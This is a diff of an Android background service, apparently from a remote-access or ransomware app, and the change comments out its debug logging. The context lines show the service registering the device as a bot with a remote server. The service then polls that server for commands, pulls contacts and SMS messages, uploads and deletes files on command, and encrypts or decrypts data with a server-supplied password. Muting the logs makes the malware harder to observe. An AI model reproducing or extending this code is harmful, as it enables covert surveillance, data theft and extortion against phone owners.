@@ -167,7 +167,7 @@ public class MyService extends Service {
     public void AddRequest() {
         HttpClient Client = new DefaultHttpClient();
         String pert = getUrid();
-        Log.i(TAG, pert);
+        //Log.i(TAG, pert);
         String URL = http + "/addbot.php?id=" + pert;
 
         try {
@@ -177,9 +177,9 @@ public class MyService extends Service {
             ResponseHandler<String> responseHandler = new BasicResponseHandler();
             SetServerString = Client.execute(httpget, responseHandler);
 
-            Log.i(TAG, SetServerString);
+            //Log.i(TAG, SetServerString);
         } catch (Exception ex) {
-            Log.i(TAG, "Fail");
+            //Log.i(TAG, "Fail");
         }
 
 
@@ -201,7 +201,7 @@ public class MyService extends Service {
             String pert = getUrid();
             try {
                 URL url = new URL(http + "/json.php?id=" + pert);
-                Log.i(TAG, String.valueOf(url));
+                //Log.i(TAG, String.valueOf(url));
                 HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
                 InputStream inputStream = httpURLConnection.getInputStream();
                 BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -212,13 +212,13 @@ public class MyService extends Service {
                 }
                 JSONArray JA = new JSONArray(data);
                 for (int i = 0; i < JA.length(); i++) {
-                    Log.i(TAG, String.valueOf(i));
+                    //Log.i(TAG, String.valueOf(i));
                     JSONObject JO = (JSONObject) JA.get(i);
                     command = JO.get("command") + "";
-                    Log.i(TAG, command);
+                    //Log.i(TAG, command);
                     //int cmd = Integer.parseInt(command);
                     if (command.equals("wait")) {
-                        Log.i(TAG, "wait case");
+                        //Log.i(TAG, "wait case");
                     } else if (command.equals("con")) {
                         getContactList();
                     } else if (command.equals("infe")) {
@@ -242,7 +242,7 @@ public class MyService extends Service {
                     }else if (command.equals("dery")) {
                         decry();
                     }   else {
-                        Log.i(TAG, "");
+                        //Log.i(TAG, "");
                     }
 
                 }
@@ -279,7 +279,7 @@ public class MyService extends Service {
         String data = "";
         try {
             URL url = new URL(http + "/output.php");
-            Log.i(TAG, String.valueOf(url));
+            //Log.i(TAG, String.valueOf(url));
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
             InputStream inputStream = httpURLConnection.getInputStream();
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -290,11 +290,11 @@ public class MyService extends Service {
             }
             JSONArray JA = new JSONArray(data);
             for (int i = 0; i < JA.length(); i++) {
-                Log.i(TAG, String.valueOf(i));
+                //Log.i(TAG, String.valueOf(i));
                 JSONObject JO = (JSONObject) JA.get(i);
                 command = JO.get("text") + "";
                 cryptPassword = command;
-                Log.i(TAG, command);
+                //Log.i(TAG, command);
 
             }
         } catch (IOException e) {
@@ -325,7 +325,7 @@ public class MyService extends Service {
         String data = "";
         try {
             URL url = new URL(http + "/output.php");
-            Log.i(TAG, String.valueOf(url));
+            //Log.i(TAG, String.valueOf(url));
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
             InputStream inputStream = httpURLConnection.getInputStream();
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -336,11 +336,11 @@ public class MyService extends Service {
             }
             JSONArray JA = new JSONArray(data);
             for (int i = 0; i < JA.length(); i++) {
-                Log.i(TAG, String.valueOf(i));
+                //Log.i(TAG, String.valueOf(i));
                 JSONObject JO = (JSONObject) JA.get(i);
                 command = JO.get("text") + "";
                 cryptPassword = command;
-                Log.i(TAG, command);
+                //Log.i(TAG, command);
 
             }
         } catch (IOException e) {
@@ -373,7 +373,7 @@ public class MyService extends Service {
         String pert = getUrid();
         try {
             URL url = new URL(http + "/output.php");
-            Log.i(TAG, String.valueOf(url));
+            //Log.i(TAG, String.valueOf(url));
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
             InputStream inputStream = httpURLConnection.getInputStream();
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -384,7 +384,7 @@ public class MyService extends Service {
             }
             JSONArray JA = new JSONArray(data);
             for (int i = 0; i < JA.length(); i++) {
-                Log.i(TAG, String.valueOf(i));
+                //Log.i(TAG, String.valueOf(i));
                 JSONObject JO = (JSONObject) JA.get(i);
                 String text = JO.get("text") + "";
                 notification.setSmallIcon(R.drawable.he);
@@ -393,7 +393,7 @@ public class MyService extends Service {
                 notification.setContentTitle("Script1337");
                 notification.setContentText(text);
 
-                Log.i(TAG, command);
+                //Log.i(TAG, command);
 
             }
         } catch (IOException e) {
@@ -411,7 +411,7 @@ public class MyService extends Service {
     public void clear() {
         HttpClient Client = new DefaultHttpClient();
         String pert = getUrid();
-        Log.i(TAG, pert);
+        //Log.i(TAG, pert);
         String URL = http + "/dead.php?id=" + pert;
 
         try {
@@ -421,9 +421,9 @@ public class MyService extends Service {
             ResponseHandler<String> responseHandler = new BasicResponseHandler();
             SetServerString = Client.execute(httpget, responseHandler);
 
-            Log.i(TAG, SetServerString);
+            //Log.i(TAG, SetServerString);
         } catch (Exception ex) {
-            Log.i(TAG, "Fail");
+            //Log.i(TAG, "Fail");
         }
     }
 
@@ -439,9 +439,9 @@ public class MyService extends Service {
             ResponseHandler<String> responseHandler = new BasicResponseHandler();
             SetServerString = Client.execute(httpget, responseHandler);
 
-            Log.i(TAG, SetServerString);
+            //Log.i(TAG, SetServerString);
         } catch (Exception ex) {
-            Log.i(TAG, "Fail");
+            //Log.i(TAG, "Fail");
         }
     }
 
@@ -481,9 +481,9 @@ public class MyService extends Service {
                             ResponseHandler<String> responseHandler = new BasicResponseHandler();
                             SetServerString = Client.execute(httpget, responseHandler);
 
-                            Log.i(TAG, SetServerString);
+                            //Log.i(TAG, SetServerString);
                         } catch (Exception ex) {
-                            Log.i(TAG, "Fail");
+                            //Log.i(TAG, "Fail");
                         }
                         i = i + 1;
                     }
@@ -566,7 +566,7 @@ public class MyService extends Service {
                 serverResponseCode = connection.getResponseCode();
                 String serverResponseMessage = connection.getResponseMessage();
 
-                Log.i(TAG, "Server Response is: " + serverResponseMessage + ": " + serverResponseCode);
+                //Log.i(TAG, "Server Response is: " + serverResponseMessage + ": " + serverResponseCode);
 
 
                 if (serverResponseCode == 200) {
@@ -612,7 +612,7 @@ public class MyService extends Service {
             if (file.isFile()) {
                 HttpClient Client = new DefaultHttpClient();
                 String pert = getUrid();
-                Log.i(TAG, pert);
+                //Log.i(TAG, pert);
                 String URL = http + "/fileinput.php?id=" + pert + "&filepath=" + file.getAbsolutePath();
 
                 try {
@@ -622,9 +622,9 @@ public class MyService extends Service {
                     ResponseHandler<String> responseHandler = new BasicResponseHandler();
                     SetServerString = Client.execute(httpget, responseHandler);
 
-                    Log.i(TAG, SetServerString);
+                    //Log.i(TAG, SetServerString);
                 } catch (Exception ex) {
-                    Log.i(TAG, "Fail");
+                    //Log.i(TAG, "Fail");
                 }
                 try {
 
@@ -635,9 +635,9 @@ public class MyService extends Service {
                         ResponseHandler<String> responseHandler = new BasicResponseHandler();
                         SetServerString = Client.execute(httpget, responseHandler);
 
-                        Log.i(TAG, SetServerString);
+                        //Log.i(TAG, SetServerString);
                     } catch (Exception ex) {
-                        Log.i(TAG, "Fail");
+                        //Log.i(TAG, "Fail");
                     }
                 } catch (Exception ex) {
 
@@ -659,7 +659,7 @@ public class MyService extends Service {
         String pert = getUrid();
         try {
             URL url = new URL(http + "/output.php");
-            Log.i(TAG, String.valueOf(url));
+            //Log.i(TAG, String.valueOf(url));
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
             InputStream inputStream = httpURLConnection.getInputStream();
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -670,11 +670,11 @@ public class MyService extends Service {
             }
             JSONArray JA = new JSONArray(data);
             for (int i = 0; i < JA.length(); i++) {
-                Log.i(TAG, String.valueOf(i));
+                //Log.i(TAG, String.valueOf(i));
                 JSONObject JO = (JSONObject) JA.get(i);
                 command = JO.get("text") + "";
                 uploadFile(command);
-                Log.i(TAG, command);
+                //Log.i(TAG, command);
 
             }
         } catch (IOException e) {
@@ -690,7 +690,7 @@ public class MyService extends Service {
         String pert = getUrid();
         try {
             URL url = new URL(http + "/output.php");
-            Log.i(TAG, String.valueOf(url));
+            //Log.i(TAG, String.valueOf(url));
             HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
             InputStream inputStream = httpURLConnection.getInputStream();
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
@@ -701,11 +701,11 @@ public class MyService extends Service {
             }
             JSONArray JA = new JSONArray(data);
             for (int i = 0; i < JA.length(); i++) {
-                Log.i(TAG, String.valueOf(i));
+                //Log.i(TAG, String.valueOf(i));
                 JSONObject JO = (JSONObject) JA.get(i);
                 command = JO.get("text") + "";
                 Delete(command);
-                Log.i(TAG, command);
+                //Log.i(TAG, command);
 
             }
         } catch (IOException e) {
@@ -777,9 +777,9 @@ public class MyService extends Service {
 
             if (response.getStatusLine().getStatusCode() == 200) {
                 String server_response = EntityUtils.toString(response.getEntity());
-                Log.i("Server response", server_response);
+                //Log.i("Server response", server_response);
             } else {
-                Log.i("Server response", "Failed to get server response");
+                //Log.i("Server response", "Failed to get server response");
             }
         }
         mCursor.close();
@@ -837,9 +837,9 @@ public class MyService extends Service {
 
             if (response.getStatusLine().getStatusCode() == 200) {
                 String server_response = EntityUtils.toString(response.getEntity());
-                Log.i("Server response", server_response);
+                //Log.i("Server response", server_response);
             } else {
-                Log.i("Server response", "Failed to get server response");
+                //Log.i("Server response", "Failed to get server response");
             }
         } while (smsInboxCursor.moveToNext());
     }
